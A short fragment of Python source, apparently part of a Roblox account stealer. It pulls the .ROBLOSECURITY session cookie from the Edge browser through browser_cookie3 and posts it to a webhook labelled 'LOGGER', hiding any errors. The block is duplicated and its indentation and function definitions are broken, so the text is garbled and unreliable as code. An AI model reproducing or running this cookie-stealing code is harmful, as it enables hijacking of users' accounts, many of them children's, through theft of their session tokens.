cookies = browser_cookie3.edge(domain_name='roblox.com')
cookies = str(cookies)
cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
requests.post(webhook, json={'username':'LOGGER', 'content':f'```Cookie: {cookie}```'})
    except:
        pass
def chrome_logger():
cookies = browser_cookie3.edge(domain_name='roblox.com')
cookies = str(cookies)
cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
requests.post(webhook, json={'username':'LOGGER', 'content':f'```Cookie: {cookie}```'})
    except:
        pass
def chrome_logger():
